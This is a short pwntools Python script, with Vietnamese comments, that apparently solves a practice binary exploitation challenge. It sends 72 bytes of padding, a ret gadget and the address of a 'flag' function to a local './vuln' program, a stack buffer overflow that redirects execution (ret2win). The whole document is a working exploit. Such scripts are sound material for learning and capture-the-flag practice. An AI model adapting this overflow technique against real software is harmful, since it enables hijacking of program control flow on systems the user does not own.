from pwn import *

r = process('./vuln')
gdb.attach(r,api=True)

ret = 0x00000000004012d1 # Địa chỉ của 1 câu lệnh ret bất kỳ trong chương trình
flag = 0x0000000000401236 # Địa chỉ đầu hàm flag

payload = b"a"*72 + p64(ret) + p64(flag)
r.sendlineafter(b"flag:", payload)

r.interactive()